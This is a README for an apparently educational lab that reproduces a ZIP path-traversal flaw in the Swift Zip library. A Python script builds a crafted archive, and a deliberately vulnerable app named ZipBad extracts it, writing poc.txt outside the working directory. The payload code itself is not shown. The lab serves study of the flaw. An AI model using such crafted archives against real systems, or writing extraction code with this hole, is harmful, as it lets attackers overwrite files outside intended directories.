# Swift Decompression Attack Lab

## 1. [Zip](https://github.com/marmelroy/Zip.git)

From `ZipLab` directory install the package running:

```sh
swift package update

# Output:
Fetching https://github.com/marmelroy/Zip.git from cache
Fetched https://github.com/marmelroy/Zip.git from cache (1.25s)
Computing version for https://github.com/marmelroy/Zip.git
Computed https://github.com/marmelroy/Zip.git at 2.1.2 (0.76s)
Creating working copy for https://github.com/marmelroy/Zip.git
Working copy of https://github.com/marmelroy/Zip.git resolved at 2.1.2
```

Once we have installed the library we can build our swift application:

```sh
swift build

# Output
Building for debugging...
[7/7] Applying ZipBad
Build complete! (0.87s)
```

The zip payload is crafted using python `zipfile`, the payloads writes `poc.txt` out of the current working directory, causing ZIP path traversal.

```sh
python3 poc.py
```

Pass the payload to the executable:

```sh
swift run ZipBad payload.zip

# Output
Building for debugging...
[1/1] Write swift-version--X.txt
Build complete! (0.07s)
```

Now `poc.txt` is an existing file located out of our working directory:

```sh
ls ../
README.md
ZipLab
poc.txt
```

